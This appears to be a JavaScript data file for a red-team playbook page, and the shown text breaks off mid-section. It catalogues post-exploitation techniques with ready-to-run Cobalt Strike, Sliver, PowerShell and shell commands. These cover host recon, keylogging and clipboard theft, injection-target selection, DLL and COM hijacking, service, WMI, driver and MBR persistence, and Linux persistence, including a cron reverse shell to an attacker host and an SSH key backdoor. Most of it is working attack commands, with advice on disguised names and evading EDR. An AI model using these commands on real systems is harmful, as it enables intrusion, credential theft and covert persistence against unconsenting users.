import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'HOST RECON',
    color: 'purple',
    nodes: [
      { title: 'Host Reconnaissance', subtitle: 'Seatbelt • processes • sessions', id: 'host-recon' },
      { title: 'Screenshots & Input', subtitle: 'Keylogger • clipboard • screenshots', id: 'input-capture' },
      { title: 'Process Injection Recon', subtitle: 'ETW • handle enum • token recon', id: 'process-injection-recon' },
      { title: 'Linux Recon', subtitle: 'id • uname • proc • sysinfo', id: 'linux-recon' },
      { title: 'macOS Recon & Keychain', subtitle: 'system_profiler • keychain • TCC • osquery', id: 'macos-recon' },
    ]
  },
  {
    header: 'USER PERSISTENCE',
    color: 'blue',
    nodes: [
      { title: 'Persistence', subtitle: 'Task scheduler • startup • registry', id: 'persistence' },
      { title: 'COM Hijacking', subtitle: 'Hunt hijackable COM • HKCU', id: 'com-hijack' },
      { title: 'DLL Search Order Hijack', subtitle: 'DLL planting • safe DLL search • side-loading', id: 'dll-hijack' },
    ]
  },
  {
    header: 'ELEVATED PERSISTENCE',
    color: 'red',
    nodes: [
      { title: 'Elevated Persistence', subtitle: 'Services • WMI event subscriptions', id: 'elevated-persistence' },
      { title: 'Boot Persistence', subtitle: 'Bootkit • MBR • UEFI implant', id: 'boot-persistence' },
      { title: 'Linux Persistence', subtitle: 'cron • systemd • rc.local • bashrc', id: 'linux-persistence' },
      { title: 'macOS Persistence', subtitle: 'LaunchAgents • LaunchDaemons • cron • bashrc', id: 'macos-persistence' },
    ]
  },
];

const techniques = [
  {
    id: 'host-recon',
    title: 'Host Reconnaissance',
    subtitle: 'Gather situational awareness on the compromised host before taking further action',
    tags: ['Seatbelt', 'processes', 'user sessions', 'network config', 'installed software'],
    accentColor: 'purple',
    overview: 'Host reconnaissance establishes situational awareness immediately after initial access — before taking any further action. Seatbelt provides a comprehensive host audit in one execute-assembly call. The key questions are: who is logged in, what AV/EDR is running, what network segments are reachable, and are there any quick privilege escalation vectors. Understanding the environment prevents triggering EDR detections from subsequent tool use.',
    steps: [
      'Run Seatbelt immediately after check-in for comprehensive host profiling: OS, patches, AV, processes, network',
      'Enumerate running processes to identify AV/EDR and high-value injection targets',
      'List local users and active sessions — identify privileged users currently logged in',
      'Check network configuration: interfaces, routes, DNS servers — understand reachable segments',
      'Enumerate installed software for privilege escalation vectors (vulnerable versions)',
      'Check AppLocker/WDAC policy: determine execution constraints before deploying tools',
      'Review recent files, clipboard, PowerShell history for credentials and sensitive data',
      'In Sliver: use info, whoami, ps, netstat, ifconfig commands for the same coverage without Seatbelt',
    ],
    commands: [
      {
        title: 'Windows host situational awareness — Cobalt Strike',
        code: `# Seatbelt — comprehensive host recon (via execute-assembly)
execute-assembly /path/to/Seatbelt.exe -group=all
execute-assembly /path/to/Seatbelt.exe -group=system      # OS, patches, .NET
execute-assembly /path/to/Seatbelt.exe -group=user        # User data, recent files, credentials
execute-assembly /path/to/Seatbelt.exe AntiVirus          # AV/EDR products installed
execute-assembly /path/to/Seatbelt.exe AppLocker          # AppLocker policy
execute-assembly /path/to/Seatbelt.exe WindowsDefender    # Defender status
execute-assembly /path/to/Seatbelt.exe PowerShellHistory  # PS history for creds

# Built-in Beacon commands (BOF — no new process)
ps                         # Running processes
getuid                     # Current user + token
getpid                     # Beacon's own PID
screenshot                 # Desktop screenshot
net logons                 # Logged-on users

# Shell commands (spawns cmd.exe — use sparingly)
shell whoami /all          # User + group memberships + privileges
shell net localgroup administrators
shell ipconfig /all        # Network interfaces
shell netstat -ano         # Active connections
shell quser                # Active RDP sessions
shell query session        # All sessions
shell systeminfo           # OS build, patches, hotfixes
shell wmic product get name,version   # Installed software
shell tasklist /svc        # Processes + associated services
shell sc query type= all   # All services
shell wmic /node:. /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName
shell reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL   # LSA protection
shell dir /a C:\\Users      # User directories`
      },
      {
        title: 'Windows host situational awareness — Sliver',
        code: `# Sliver built-in commands (no Seatbelt needed for basics)
sliver (session) > info           # Implant info, hostname, PID, OS version, user
sliver (session) > whoami         # Current user + token privileges
sliver (session) > ps             # Full process list with PID, PPID, user, path
sliver (session) > netstat        # Active network connections
sliver (session) > ifconfig       # Network interfaces and IPs
sliver (session) > screenshot     # Desktop screenshot

# File system recon
sliver (session) > ls C:\\Users
sliver (session) > cat C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
sliver (session) > cat C:\\Windows\\System32\\drivers\\etc\\hosts

# Execute commands (spawns process — less opsec than built-ins)
sliver (session) > execute -o cmd.exe /c whoami /all
sliver (session) > execute -o cmd.exe /c systeminfo
sliver (session) > execute -o cmd.exe /c "net localgroup administrators"
sliver (session) > execute -o cmd.exe /c "quser"
sliver (session) > execute -o cmd.exe /c "netstat -ano"

# In-process Seatbelt via Armory (preferred over shell)
sliver (session) > seatbelt -group=all
sliver (session) > seatbelt AntiVirus
sliver (session) > seatbelt AppLocker
sliver (session) > seatbelt PowerShellHistory

# Execute-assembly in-process (no new process)
sliver (session) > execute-assembly --in-process /tools/Seatbelt.exe -group=system
sliver (session) > execute-assembly --in-process /tools/WinPEAS.exe

# Registry queries via execute
sliver (session) > execute -o reg.exe query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsFirewall
sliver (session) > execute -o reg.exe query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" /v ProductName`
      }
    ]
  },
  {
    id: 'input-capture',
    title: 'Screenshots, Keylogging & Clipboard',
    subtitle: 'Capture user input and screen data for credential and intelligence gathering',
    tags: ['screenshot', 'keylogger', 'clipboard', 'SetWindowsHookEx', 'GetClipboardData'],
    accentColor: 'purple',
    overview: 'Input capture collects credentials and sensitive data that users type or copy-paste. Cobalt Strike\'s keylogger hooks keyboard input at the process level and writes to Beacon memory until retrieved. Screenshots and screenwatch provide visual context about what the user is actively working on. Clipboard monitoring catches copy-pasted passwords, MFA codes, and API tokens — high-value data that never gets written to disk.',
    steps: [
      'Take a screenshot immediately to understand what the user is actively working on',
      'Start a keylogger injected into a browser or email client process to capture credentials',
      'Monitor clipboard for copy-pasted passwords, tokens, and MFA codes',
      'Use screenwatch for periodic automated screenshots during long monitoring sessions',
      'In Sliver: use screenshot, and in-process .NET assembly for keylogging',
      'Kill the keylogger job and clear the buffer after collection to reduce memory footprint',
    ],
    commands: [
      {
        title: 'Input capture — Cobalt Strike',
        code: `# Screenshots
screenshot          # Single screenshot
screenwatch         # Continuous screenshots every N seconds
# View: View → Screenshots

# Keylogger (inject into specific process for targeting)
keylogger           # Keylog current session
keylogger 1234      # Inject keylogger into PID 1234 (e.g., browser, email client)
# View: View → Keystrokes
jobs                # List running jobs
jobkill <JOB_ID>    # Kill keylogger job

# Clipboard
clipboard           # Read current clipboard contents once

# Continuous clipboard monitoring (PowerShell loop via shell)
shell powershell -c "while($true) { $clip = Get-Clipboard; if ($clip) { Write-Output \"[CLIP] $clip\" }; Start-Sleep 3 }"

# Recent files and history (via Seatbelt)
execute-assembly /path/to/Seatbelt.exe RecentFiles
execute-assembly /path/to/Seatbelt.exe PowerShellHistory
execute-assembly /path/to/Seatbelt.exe InterestingFiles`
      },
      {
        title: 'Input capture — Sliver',
        code: `# Screenshot (built-in)
sliver (session) > screenshot
# Saved to: /tmp/screenshot_*.png

# Continuous screenshots (loop with execute)
sliver (session) > execute -o cmd.exe /c "powershell -c while($true){ screenshot; Start-Sleep 10 }"

# Keylogging via execute-assembly (SharpKeylogger or similar)
sliver (session) > execute-assembly --in-process /tools/SharpKeylogger.exe

# Clipboard via PowerShell (execute)
sliver (session) > execute -o powershell.exe -Command "Get-Clipboard"

# Continuous clipboard monitor via execute-assembly
sliver (session) > execute-assembly --in-process /tools/SharpClipboard.exe

# Seatbelt recent files and PS history
sliver (session) > seatbelt RecentFiles
sliver (session) > seatbelt PowerShellHistory
sliver (session) > cat C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`
      }
    ]
  },
  {
    id: 'process-injection-recon',
    title: 'Process & Token Reconnaissance',
    subtitle: 'Deep enumeration of running processes, handles, tokens, ETW sessions, and EDR telemetry before acting',
    tags: ['process recon', 'ETW', 'handle enumeration', 'token recon', 'EDR detection', 'inject target selection'],
    accentColor: 'purple',
    overview: `Before injecting into a process or performing privileged actions, deeper process reconnaissance identifies ideal injection targets (processes with required tokens, no EDR hooks, in a useful network context) and maps the EDR telemetry landscape so actions can be tuned to avoid detection triggers.

Key intelligence to gather:
- Which processes have SeDebugPrivilege, SeImpersonatePrivilege, or hold DA tokens
- Which processes are NOT watched by the EDR (e.g., processes spawned before the EDR loaded)
- ETW provider registration: which providers are active, what events are being collected
- Handle table: processes holding handles to LSASS, Domain Controllers, or other high-value objects
- Memory integrity / CFG state of candidate injection targets`,
    steps: [
      'List all processes with full token details — identify DA-token processes, service accounts, and browser processes for injection',
      'Enumerate handles per process to identify which processes hold LSASS handles (EDR sentinel processes)',
      'Query ETW sessions to understand what providers are actively logging and to which consumers',
      'Check for EDR driver presence via loaded kernel modules and known driver names',
      'Use Seatbelt to dump CLR data — find .NET processes for in-process execute-assembly injection',
      'Identify processes with network connections to DCs/LDAP — ideal injection targets for AD ops',
      'Review process integrity levels and parent-child relationships to understand what spawning is "normal"',
    ],
    commands: [
      {
        title: 'Deep process and token enumeration',
        code: `# Seatbelt — full process token details
execute-assembly /tools/Seatbelt.exe TokenPrivileges
execute-assembly /tools/Seatbelt.exe ProcessCreationEvents
execute-assembly /tools/Seatbelt.exe NamedPipes
execute-assembly /tools/Seatbelt.exe HandleProcess

# PowerShell — list processes with integrity levels + tokens
Get-Process | ForEach-Object {
  try {
    $h = $_.Handle
    $t = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    [PSCustomObject]@{ Name=$_.Name; PID=$_.Id; User=$_.UserName }
  } catch {}
} | Sort-Object User

# Enumerate ETW sessions (what is the EDR logging?)
logman query -ets   # List active ETW sessions
wevtutil el         # List registered event logs
# Look for: Microsoft-Windows-Threat-Intelligence, SentinelOne, CrowdStrike, Carbon Black providers

# Find processes holding LSASS handle (EDR sentinel)
Get-Process | ForEach-Object {
  $proc = $_
  try {
    $handles = [Diagnostics.Process]::GetProcesses() | Where-Object { $_.Id -eq $proc.Id }
    # Use SysInternals Handle.exe for full handle enumeration
  } catch {}
}
execute-assembly /tools/Handle.exe -p lsass.exe

# SharpHound targeting — find DA sessions for injection
execute-assembly /tools/SharpHound.exe -c Session --Loop --LoopDuration 00:30:00
# Identifies which workstations have DA users currently logged in

# Netstat — processes with DC connections (ideal injection for AD ops)
shell netstat -ano | findstr ":389 :636 :88 :3268"
# Map port to PID, then check ps output for process name`
      }
    ]
  },
  {
    id: 'dll-hijack',
    title: 'DLL Search Order Hijacking',
    subtitle: 'Plant malicious DLLs in locations searched before legitimate ones — no admin required for user-writable paths',
    tags: ['DLL hijacking', 'DLL side-loading', 'DLL planting', 'SafeDllSearchMode', 'PATH hijacking', 'missing DLL'],
    accentColor: 'blue',
    overview: `Windows DLL search order: application directory → System32 → System → Windows → CWD → PATH directories. Missing DLLs searched in those locations allow planting a malicious DLL that is loaded before the real one.

Three distinct attack surfaces:
1. MISSING DLL: application calls LoadLibrary("missing.dll") — plant the DLL in a searched directory (often app dir or a PATH entry)
2. DLL SIDE-LOADING: legitimate signed binary loads a DLL by name from the same directory — copy the signed binary + malicious DLL to an attacker-controlled path
3. PATH HIJACKING: a writable directory appears before System32 in the system PATH — any application calling LoadLibrary with a bare filename resolves to your DLL first

Detection: ProcMon with filter "CreateFile" + "NAME NOT FOUND" on .dll extension reveals all hijackable opportunities in real time.`,
    steps: [
      'Use ProcMon to capture DLL loads: filter Path ends with .dll AND Result = NAME NOT FOUND — reveals missing DLLs',
      'Focus on DLLs loaded by privileged apps (scheduled tasks, services, auto-starting apps)',
      'Check write permissions on directories in the search path for the target application',
      'DLL side-loading: copy signed binary + malicious DLL (same name as legitimate one) to a user-writable path',
      'Craft a proxy DLL if the target exports functions — forward all exports to the real DLL while running payload in DllMain',
      'Test the hijack: place DLL, trigger the application, confirm execution with a benign beacon',
      'For persistence: combine with a registry AutoRun or startup entry that runs the hijacked application',
    ],
    commands: [
      {
        title: 'DLL hijack identification and exploitation',
        code: `# Step 1: Find missing DLLs using ProcMon
# Procmon filters:
# - Operation: CreateFile
# - Result: NAME NOT FOUND
# - Path: *.dll
# Run target app and observe all NAME NOT FOUND DLL lookups

# Step 2: Check directory writability
icacls "C:\\Program Files\\TargetApp\\"   # Can we write here?
# Or check PATH dirs:
foreach ($dir in $env:PATH.Split(';')) { icacls $dir 2>$null | findstr /i "BUILTIN\\Users.*Write\|Everyone.*Write" }

# Step 3: Craft malicious DLL (proxy DLL)
# The DLL forwards all expected exports to the real DLL
# Compile with: x86_64-w64-mingw32-gcc -shared -o target.dll evil.c
# DLL source template:
cat > evil.c << 'EOF'
#include <windows.h>

// Proxy exports (add all expected exports here)
// __declspec(dllexport) void OriginalExport() { ... real DLL call ... }

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // Execute beacon payload in a new thread
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_addr, NULL, 0, NULL);
    }
    return TRUE;
}
EOF

# Step 4: DLL side-loading example — OneDrive update mechanism
# Copy legitimate OneDrive binary + malicious version.dll to attacker path
copy "C:\\Program Files\\Microsoft OneDrive\\OneDriveSetup.exe" C:\\Temp\\
copy evil.dll "C:\\Temp\\version.dll"
C:\\Temp\\OneDriveSetup.exe   # Loads version.dll from its own dir first

# Step 5: Generate DLL proxy with SharpDllProxy (automated export forwarding)
execute-assembly /tools/SharpDllProxy.exe --dll C:\\Windows\\System32\\version.dll --payload beacon.bin
# Creates a proxy DLL that forwards all exports + runs shellcode

# Step 6: Persistence — pair with registry AutoRun
reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "C:\\Temp\\OneDriveSetup.exe" /f`
      }
    ]
  },
  {
    id: 'persistence',
    title: 'Host Persistence (User-level)',
    subtitle: 'Establish persistence as the current user — survives logoff and reboot without admin rights',
    tags: ['task scheduler', 'startup folder', 'registry AutoRun', 'HKCU', 'persistence'],
    accentColor: 'blue',
    overview: 'User-level persistence survives logoff and reboot without requiring administrative privileges. The three primary mechanisms — startup folder, HKCU AutoRun registry key, and scheduled task — all execute payloads when the user logs in. Using a LOLBin (Living Off the Land Binary) as the launcher (mshta, regsvr32, wscript) reduces AV detection compared to directly referencing a beacon EXE. Obfuscating the command in registry values defeats string-based detection.',
    steps: [
      'Startup Folder: drop a binary or LNK in the user\'s startup folder — runs on every logon',
      'Registry AutoRun (HKCU): add a value to HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
      'Task Scheduler (user context): create a scheduled task running as the current user at logon',
      'All three methods require only user-level permissions — no admin needed',
      'Use a living-off-the-land binary (LOLBin) as the persistence launcher to reduce AV detection',
      'Obfuscate the command in the registry value or task XML to evade string-based detection',
    ],
    commands: [
      {
        title: 'User-level persistence methods',
        code: `# 1. Startup folder persistence
# Drop beacon to startup folder
copy beacon.exe "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe"

# Drop LNK with hidden execution
$lnk = (New-Object -Com WScript.Shell).CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk")
$lnk.TargetPath = "C:\\Windows\\System32\\cmd.exe"
$lnk.Arguments = "/c start /min C:\\ProgramData\\beacon.exe"
$lnk.WindowStyle = 7
$lnk.Save()

# 2. Registry AutoRun (HKCU — no admin)
shell reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsHelper" /t REG_SZ /d "C:\\ProgramData\\beacon.exe" /f
# Or via PowerShell:
New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "C:\\ProgramData\\beacon.exe"

# 3. Scheduled task (user context)
shell schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\\ProgramData\\beacon.exe" /sc onlogon /ru "%USERNAME%" /f

# Verify persistence
shell schtasks /query /tn "MicrosoftEdgeUpdate"
shell reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`
      }
    ]
  },
  {
    id: 'com-hijack',
    title: 'COM Hijacking for Persistence',
    subtitle: 'Hijack COM object registrations in HKCU to execute code when legitimate apps load the COM',
    tags: ['COM hijacking', 'HKCU', 'CLSID', 'InProcServer32', 'DLL hijack', 'persistence'],
    accentColor: 'blue',
    overview: 'COM hijacking exploits the Windows COM object resolution order: HKCU is checked before HKLM, and HKCU is writable by any user without elevation. When a legitimate application loads a COM object whose HKCU registration is missing, Windows falls through to HKLM. An attacker creates the HKCU key pointing to a malicious DLL — the next time the application loads that COM object, the DLL executes in the application\'s process context. This is completely user-level and leaves minimal forensic traces.',
    steps: [
      'COM hijacking: register a malicious DLL under HKCU for a CLSID that an application loads',
      'HKCU takes precedence over HKLM for COM resolution — no admin rights needed',
      'Use ProcMon to find CLSIDs that load from HKCU/NOT FOUND when apps launch',
      'Look for legitimate apps that are regularly used (Explorer, Edge, Task Scheduler) loading missing COM keys',
      'Create HKCU\\SOFTWARE\\Classes\\CLSID\\{CLSID}\\InProcServer32 pointing to malicious DLL',
      'Malicious DLL is executed in the context of the app loading it — low EDR footprint',
    ],
    commands: [
      {
        title: 'COM hijacking methodology',
        code: `# Step 1: Find hijackable COM keys using ProcMon
# In ProcMon filter:
# - Operation: RegOpenKey
# - Result: NAME NOT FOUND
# - Path: HKCU\\SOFTWARE\\Classes\\CLSID
# Launch target application and observe — note missing CLSIDs

# Step 2: Verify CLSID exists in HKLM (can be hijacked via HKCU)
reg query "HKLM\\SOFTWARE\\Classes\\CLSID\\{CLSID}" /s

# Step 3: Register malicious DLL in HKCU
$clsid = "{CLSID-HERE}"
$dllPath = "C:\\Users\\$env:USERNAME\\AppData\\Local\\malicious.dll"

New-Item -Path "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InProcServer32" -Force
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InProcServer32" -Name "(Default)" -Value $dllPath
Set-ItemProperty -Path "HKCU:\SOFTWARE\Classes\CLSID\$clsid\InProcServer32" -Name "ThreadingModel" -Value "Apartment"

# Step 4: Verify by launching the application — DLL loads automatically
# Example: Task Scheduler wizard loads specific CLSIDs — hijack one
# Explorer.exe loads hundreds of CLSIDs — very easy to find candidates

# Craft malicious DLL (DllMain executes beacon)
# The DLL must export the expected interface or simply run code in DllMain
# Compile as DLL: x86_64-w64-mingw32-gcc -shared -o malicious.dll loader.c`
      }
    ]
  },
  {
    id: 'boot-persistence',
    title: 'Boot-Level & Driver Persistence',
    subtitle: 'Persist through reboots via Windows boot sequence — bootkit, UEFI implant, or signed driver abuse',
    tags: ['bootkit', 'UEFI', 'MBR', 'kernel driver', 'BYOVD persistence', 'signed driver', 'early launch'],
    accentColor: 'red',
    overview: `Boot-level persistence survives OS reinstalls (UEFI implants) and defeats most forensic tools (bootkits pre-empt the OS loader). Three tiers:

1. KERNEL DRIVER PERSISTENCE: install a signed driver service entry — runs before user-mode EDR agents load. Can hook system calls, disable audit logging, and establish network connectivity before Windows login screen appears.

2. BOOTKIT: modify the MBR/VBR or Windows Boot Manager (bootmgr) to inject code before the OS kernel loads — survives OS reinstalls to the same disk partition.

3. UEFI IMPLANT: write a UEFI module to the SPI flash — survives disk reformatting, OS reinstall, and even secure boot bypass on vulnerable firmware. Requires physical access or a UEFI vulnerability + ring-0 access.

In practice for red teams: signed driver persistence (tier 1) is most operationally relevant — it provides SYSTEM execution before EDR, survives reboots, and is detectable but hard to remediate without kernel driver signing infrastructure.`,
    steps: [
      'Signed Driver Service: create a service entry for a legitimate signed driver, load with kernel privileges at boot',
      'BYOVD driver: bring a vulnerable signed driver, load it to get a kernel R/W primitive, install hook for persistence',
      'Registry service entry: HKLM\\SYSTEM\\CurrentControlSet\\Services — add ImagePath pointing to driver, Start=0 (boot)',
      'Early launch anti-malware (ELAM) slot: a signed ELAM driver loads before all other drivers — abuse for early execution',
      'MBR persistence: write shellcode to MBR using raw disk I/O — loads before bootmgr, hard to detect by file scanners',
      'Check Secure Boot status before attempting bootkit: bcdedit /enum firmware, mokutil --sb-state (Linux)',
    ],
    commands: [
      {
        title: 'Signed driver persistence via service registry',
        code: `# Step 1: Create service entry for a driver (requires admin/SYSTEM)
# Method: registry service entry — Start=0 means boot start (before EDR)
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinNetHelper" /v "ImagePath" /t REG_EXPAND_SZ /d "\\??\\C:\\Windows\\System32\\drivers\\winnethelper.sys" /f
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinNetHelper" /v "Type" /t REG_DWORD /d 1 /f      # SERVICE_KERNEL_DRIVER
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinNetHelper" /v "Start" /t REG_DWORD /d 0 /f     # SERVICE_BOOT_START
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinNetHelper" /v "ErrorControl" /t REG_DWORD /d 0 /f
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinNetHelper" /v "DisplayName" /t REG_SZ /d "Windows Network Helper" /f

# Copy the driver binary (must be signed for Secure Boot systems)
# For test environments without HVCI:
copy malicious.sys "C:\\Windows\\System32\\drivers\\winnethelper.sys"

# Load immediately (in addition to boot persistence):
sc start WinNetHelper

# Step 2: MBR backup and modification (requires admin, no Secure Boot)
# Backup current MBR:
dd if=\\\\.\\PhysicalDrive0 of=mbr_backup.bin bs=512 count=1 2>/dev/null   # Linux equivalent
# Or on Windows with dd port:
execute-assembly /tools/dd.exe if=\\\\.\\PhysicalDrive0 of=C:\\Temp\\mbr.bin bs=512 count=1

# Restore MBR (cleanup):
execute-assembly /tools/dd.exe if=C:\\Temp\\mbr.bin of=\\\\.\\PhysicalDrive0 bs=512 count=1

# Step 3: Check boot integrity before and after
bcdedit /enum all                      # Windows boot configuration
bcdedit /enum firmware                 # UEFI firmware boot entries
# Verify Secure Boot:
Confirm-SecureBootUEFI                 # PowerShell — returns True if Secure Boot on
reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State"

# Step 4: BYOVD driver service for persistence
# Load known-vulnerable driver (e.g., RTCore64.sys, mhyprot2.sys)
sc create RTCore64 binPath= C:\\Windows\\Temp\\RTCore64.sys type= kernel
sc start RTCore64
# Use kernel R/W primitive to install hook or patch PPL for persistence`
      }
    ]
  },
  {
    id: 'elevated-persistence',
    title: 'Elevated Persistence (Admin/SYSTEM)',
    subtitle: 'Establish persistence with admin or SYSTEM privileges — survives reboots',
    tags: ['Windows services', 'WMI event subscription', 'elevated persistence', 'SYSTEM'],
    accentColor: 'red',
    overview: 'Elevated persistence mechanisms survive reboots and run with SYSTEM or administrator privileges. Windows services are the most reliable — they restart automatically, run as SYSTEM, and are difficult to disable without admin rights. WMI event subscriptions are stealthier: they run in WmiPrvSE.exe context and persist through reboots, surviving even if the original beacon binary is deleted (until the subscription is removed). Both require admin-level access to create.',
    steps: [
      'Windows Services: install a service that runs a beacon as SYSTEM on startup — very stealthy if named like a legit service',
      'WMI Event Subscriptions: trigger a command when a WMI event fires (process creation, time interval, login)',
      'Services require admin; WMI subscriptions persist through reboot and are harder to detect than scheduled tasks',
      'Name services convincingly: "Windows Update Helper", "Microsoft Security Monitor"',
      'WMI subscriptions run in WmiPrvSE.exe context — unusual child processes from WmiPrvSE alert EDRs',
      'For stealth: use existing services (DLL hijack in a service binary) rather than creating a new service',
    ],
    commands: [
      {
        title: 'Service and WMI persistence',
        code: `# Windows Service persistence
# Using sc.exe
sc create "WindowsUpdateSvc" binPath= "C:\\Windows\\Temp\\beacon.exe" start= auto DisplayName= "Windows Update Helper"
sc description "WindowsUpdateSvc" "Provides updates for Windows components"
sc start "WindowsUpdateSvc"

# CS beacon command
shell sc create "WinHelper" binPath= "C:\\ProgramData\\update.exe" start= auto
shell sc start "WinHelper"

# WMI Event Subscription persistence
# Filter: fires every 60 seconds
$filterArgs = @{
    Name = 'TimerFilter'
    EventNameSpace = 'root\\cimv2'
    QueryLanguage = 'WQL'
    Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime" AND TargetInstance.Second = 0'
}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

# Consumer: runs beacon
$consumerArgs = @{
    Name = 'TimerConsumer'
    CommandLineTemplate = 'C:\\ProgramData\\beacon.exe'
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# Binding
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs

# Verify
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer`
      }
    ]
  },
];

const linuxTechniques = [
  {
    id: 'linux-recon',
    title: 'Linux Host Reconnaissance',
    subtitle: 'Gather situational awareness on a compromised Linux host',
    tags: ['id', 'uname', 'ps', 'netstat', 'find', 'SUID', 'capabilities', 'cron'],
    accentColor: 'purple',
    overview: 'Linux host reconnaissance follows the same logic as Windows — establish who you are, what the system is, and what paths to root exist. The key outputs are: sudo permissions (sudo -l), SUID binaries (find / -perm -4000), writable cron scripts, capabilities (getcap -r /), and SSH keys. LinPEAS automates all of these checks and colour-codes findings by severity.',
    steps: [
      'Check current user context, groups, and sudo rights — key to knowing what escalation paths exist',
      'Enumerate OS version, kernel, and architecture — identify known kernel exploits',
      'List running processes, cron jobs, and scheduled tasks for privesc opportunities',
      'Check network config: interfaces, listening ports, firewall rules, ARP cache',
      'Find SUID/SGID binaries and capabilities — frequent GTFObins privesc vectors',
      'Enumerate writable paths, interesting files, SSH keys, history, and config files',
    ],
    commands: [
      {
        title: 'Linux situational awareness',
        code: `# User and privilege context
id && groups && sudo -l
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/group

# OS and kernel
uname -a
cat /etc/os-release
lscpu

# Processes and services
ps auxf
systemctl list-units --type=service --state=running

# Network
ip a && ip route
ss -tlnp        # Listening ports
cat /etc/hosts
arp -a

# Cron jobs
crontab -l
cat /etc/crontab
ls /etc/cron.*

# SUID/SGID binaries (GTFObins)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null | grep -v proc

# SSH keys and bash history
find /home /root -name "*.ssh" -o -name "id_rsa*" 2>/dev/null
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null

# Interesting files
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "wp-config.php" -o -name ".env" -o -name "database.yml" 2>/dev/null

# LinPEAS automated enum
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
      }
    ]
  },
  {
    id: 'linux-persistence',
    title: 'Linux Persistence Mechanisms',
    subtitle: 'Establish persistence on Linux hosts via cron, systemd, SSH, and shell hooks',
    tags: ['cron', 'systemd', 'rc.local', '.bashrc', 'authorized_keys', 'LD_PRELOAD'],
    accentColor: 'red',
    overview: 'Linux persistence mechanisms range from cron jobs (user or root level) to systemd services (boot-persistent, root-level) to SSH authorized_keys (instant persistent access without a beacon at all). Shell hooks via .bashrc/.profile fire on every interactive terminal session. LD_PRELOAD hijacking injects a shared library into privileged binaries. Each technique has different persistence scope, privilege requirements, and detectability trade-offs.',
    steps: [
      'Cron job: add entry to crontab or /etc/cron.* for recurring execution',
      'Systemd service: create a .service unit that starts on boot — admin-level persistence',
      'SSH authorized_keys: add attacker public key to ~/.ssh/authorized_keys for permanent access',
      'Shell hooks: append payload to ~/.bashrc or ~/.profile — fires on every user login',
      'rc.local: append to /etc/rc.local for root-level execution on boot (legacy systems)',
      'LD_PRELOAD hijacking: inject a shared library that loads with any privileged binary',
    ],
    commands: [
      {
        title: 'Linux persistence techniques',
        code: `# Cron persistence (user-level)
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'") | crontab -

# Cron persistence (system-level, requires root)
echo "* * * * * root /tmp/.hidden/beacon" >> /etc/crontab

# Systemd service (root)
cat > /etc/systemd/system/systemd-network-helper.service << EOF
[Unit]
Description=Network Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.hidden/beacon
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
systemctl enable systemd-network-helper
systemctl start systemd-network-helper

# SSH authorized_keys backdoor
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Bashrc hook
echo 'nohup /tmp/.hidden/beacon &>/dev/null &' >> ~/.bashrc
echo 'nohup /tmp/.hidden/beacon &>/dev/null &' >> ~/.profile

# rc.local (legacy)
echo '/tmp/.hidden/beacon &' >> /etc/rc.local
chmod +x /etc/rc.local

# LD_PRELOAD hijack (root — inject into any suid binary)
# Compile shared lib that runs beacon in constructor
